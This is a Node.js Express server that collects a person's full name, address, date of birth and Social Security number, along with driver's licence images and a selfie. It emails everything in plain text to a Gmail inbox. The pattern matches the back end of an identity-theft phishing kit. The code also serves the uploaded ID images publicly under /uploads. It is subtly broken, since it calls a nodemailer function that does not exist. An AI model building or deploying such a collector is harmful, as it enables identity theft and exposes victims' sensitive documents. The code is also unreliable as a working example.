const express = require('express');
const multer = require('multer');
const nodemailer = require('nodemailer');
const path = require('path');
require('dotenv').config();

const app = express();
const port = 3000;

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, 'uploads/');
  },
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  }
});
const upload = multer({ storage: storage });

// Serve static files
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

// Parse URL-encoded bodies
app.use(express.urlencoded({ extended: true }));

// Route to serve the form
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Route to handle form submission
app.post('/submit', upload.fields([
  { name: 'driversLicenseFront', maxCount: 1 },
  { name: 'driversLicenseBack', maxCount: 1 },
  { name: 'selfie', maxCount: 1 }
]), (req, res) => {
  const { fullName, lastName, phoneNumber, address, gender, dateOfBirth, ssn } = req.body;
  const files = req.files;

  // Create email transporter
  const transporter = nodemailer.createTransporter({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER, // Set your Gmail address
      pass: process.env.GMAIL_PASS  // Set your Gmail app password
    }
  });

  // Prepare email content
  let mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL, // Your Gmail to receive
    subject: 'New Form Submission',
    text: `
      Full Name: ${fullName}
      Last Name: ${lastName}
      Phone Number: ${phoneNumber}
      Address: ${address}
      Gender: ${gender}
      Date of Birth: ${dateOfBirth}
      SSN: ${ssn}
    `,
    attachments: []
  };

  // Add attachments
  if (files.driversLicenseFront) {
    mailOptions.attachments.push({
      filename: 'drivers_license_front' + path.extname(files.driversLicenseFront[0].originalname),
      path: files.driversLicenseFront[0].path
    });
  }
  if (files.driversLicenseBack) {
    mailOptions.attachments.push({
      filename: 'drivers_license_back' + path.extname(files.driversLicenseBack[0].originalname),
      path: files.driversLicenseBack[0].path
    });
  }
  if (files.selfie) {
    mailOptions.attachments.push({
      filename: 'selfie' + path.extname(files.selfie[0].originalname),
      path: files.selfie[0].path
    });
  }

  // Send email
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send('Error sending email');
    } else {
      console.log('Email sent: ' + info.response);
      res.send('Form submitted successfully');
    }
  });
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});